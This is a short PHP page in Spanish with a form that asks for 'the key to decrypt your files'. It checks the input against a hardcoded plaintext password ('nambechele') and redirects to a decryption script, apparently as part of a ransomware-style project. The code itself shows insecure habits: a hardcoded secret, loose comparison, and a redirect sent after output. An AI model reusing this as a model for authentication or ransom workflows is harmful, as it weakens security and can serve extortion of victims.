<?php

    if(@$_POST['btnSubmitPass']) {
        $passwordGiven = $_POST['password'];
        if($passwordGiven == 'nambechele') {
            echo "<script>alert('Autentificado!')</script>";
            header("Location: ../controller/desencriptarData.php");
        } else {
            echo "<script>alert('La llave no es la correcta!')</script>";
        }
    }
    

?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ingresar la contraseña</title>
</head>
<body>

    <form action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']);?>" method="POST">
        <label for="password">Ingresa la llave para desencriptar tus archivos: </label>
        <input type="password" name="password" id="">
        <input type="submit" name="btnSubmitPass" id="" value="Verificar">
    </form>
    
</body>
</html>